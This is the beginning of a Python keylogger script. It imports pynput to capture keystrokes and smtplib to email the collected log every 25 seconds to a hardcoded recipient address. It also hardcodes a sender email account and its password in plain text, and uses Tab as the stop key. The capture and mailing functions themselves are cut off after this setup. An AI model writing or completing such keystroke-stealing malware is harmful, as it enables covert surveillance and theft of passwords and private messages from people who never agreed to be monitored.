#  module for capturing the keyboard events 
from pynput import keyboard
#  allows creation of a function which execute at an interval
from threading import Timer
# a module which allows you to sent emails using the Simple Mail Trasfer Protocol
import smtplib
# for formating mail text
from email.mime.text import MIMEText


# setting email paramater to be deployed
email_adress = "keyloggeremail@proton.mail"
email_password = "Loghirobombfatboyshimastbak@1945"
recipient_email_adress = "youshouldbesafebutnot@gmail.com"
#this represent te time in seconds when to recieve the email report
log_interval = 25

# creating a variable to store the keystrokes that have been collected.
keys_log = ""
#using the tab in keyboard to stop collectinng key logs
exit_keylogging  = keyboard.Key.tab


